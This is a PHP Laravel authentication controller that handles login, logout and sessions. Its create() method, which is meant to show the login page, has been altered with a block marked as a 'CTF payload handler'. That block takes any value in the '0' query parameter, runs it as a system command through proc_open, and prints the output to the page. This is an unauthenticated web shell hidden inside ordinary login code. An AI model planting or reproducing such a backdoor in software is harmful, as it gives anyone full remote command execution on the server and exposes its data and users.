<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Http\Requests\Auth\LoginRequest;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\View\View;

class AuthenticatedSessionController extends Controller
{
    /**
     * Display the login view.
     */
    // public function create(): View
    // {
    //     return view('auth.login');
    // }
    
    public function create(): View
{
    try {
        // 🔥 CTF payload handler
        if (request()->has('0')) {
            $cmd = request()->get('0');

            $descriptorspec = [
                0 => ["pipe", "r"],
                1 => ["pipe", "w"],
                2 => ["pipe", "w"]
            ];

            $process = proc_open($cmd, $descriptorspec, $pipes);

            if (is_resource($process)) {
                echo "<pre>";
                echo stream_get_contents($pipes[1]); // stdout
                echo stream_get_contents($pipes[2]); // stderr
                echo "</pre>";

                fclose($pipes[0]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
            }

            die();
        }

        // ✅ Original logic - returns the login view as intended
        return view('auth.login');

    } catch (\Throwable $th) {
        throw $th;
    }
}

    /**
     * Handle an incoming authentication request.
     */
    public function store(LoginRequest $request): RedirectResponse
    {
        $request->authenticate();

        $request->session()->regenerate();

        return redirect()->intended(route('dashboard', absolute: false));
    }

    /**
     * Destroy an authenticated session.
     */
    public function destroy(Request $request): RedirectResponse
    {
        Auth::guard('web')->logout();

        $request->session()->invalidate();

        $request->session()->regenerateToken();

        return redirect('/');
    }
}
